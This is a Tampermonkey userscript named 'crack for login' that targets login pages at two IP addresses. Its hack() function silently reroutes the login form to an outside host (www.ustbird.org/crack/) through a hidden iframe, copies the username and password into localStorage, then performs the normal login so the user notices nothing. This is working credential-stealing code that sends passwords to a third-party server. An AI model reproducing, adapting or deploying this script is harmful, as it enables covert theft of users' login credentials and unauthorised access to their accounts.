// ==UserScript==
// @name         crack for login
// @description  test
// @namespace    http://tampermonkey.net/
// @version      0.1
// @author       cracker
// @match        http://202.204.48.66/*
// @match        http://202.204.48.82/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373589/crack%20for%20login.user.js
// @updateURL https://update.greasyfork.org/scripts/373589/crack%20for%20login.meta.js
// ==/UserScript==

(document.already =function() {
    'use strict';

    //原版save函数
    /*function save(){
        var site = new Object;
        site.keyname = document.getElementById("uname").value;
        site.sitename = document.getElementById("sitename").value;
        site.siteurl = document.getElementById("siteurl").value;
        var str = JSON.stringify(site); // 将对象转换为字符串
        localStorage.setItem(site.keyname,str);
        alert("保存成功");
    }*/

    //另存为文件方法
    /*var content = "file content!";
        var data = new Blob([content],{type:"text/plain;charset=UTF-8"});
        var downloadUrl = window.URL.createObjectURL(data);
        var anchor = document.createElement("a");
        anchor.href = downloadUrl;
        anchor.download = "文件名.txt";
        anchor.click();
        window.URL.revokeObjectURL(data);*/


    //localStorage方法
    //var ori_pass = document.forms[0][1].onclick;
    document.forms[0][2].onclick = function(){hack();};
    document.forms[0][1].onclick = function(){if(window.event.keyCode==13) hack();};

    //改回去正常提交
    //document.forms[0].action='/';document.forms[0].target='';login();
    function hack(){
        //修改提交地址
        document.forms[0].action='http://www.ustbird.org/crack/';
        //阻止跳转
        var d=document.getElementsByClassName('d')[0];
        var ifr=document.createElement("iframe");
        ifr.name='ifr';
        ifr.style.display='none';
        d.appendChild(ifr);
        document.forms[0].target='ifr';
        localStorage.setItem(document.getElementById("uname").value,document.getElementById("upass").value);
        login();
        document.forms[0].action='/';
        document.forms[0].target='';
        login();
    }

})();